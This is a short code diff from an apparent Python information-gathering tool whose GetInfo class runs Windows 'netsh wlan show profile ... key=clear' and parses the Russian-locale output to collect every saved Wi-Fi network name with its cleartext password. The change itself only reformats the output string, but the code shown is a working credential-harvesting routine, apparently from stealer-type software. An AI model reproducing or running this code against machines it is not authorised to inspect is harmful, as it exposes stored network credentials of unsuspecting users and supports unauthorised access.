@@ -69,7 +69,7 @@ class GetInfo:
             results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
             results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
             try:
-                passwords.append(f'Network name: {wifi}, Password: {results[0]}')
+                passwords.append(f'Network name: {wifi}\nPassword: {results[0]}')
             except IndexError:
                 passwords.append(f'Network name: {wifi}, Password not found!')
         return "\n".join(passwords)
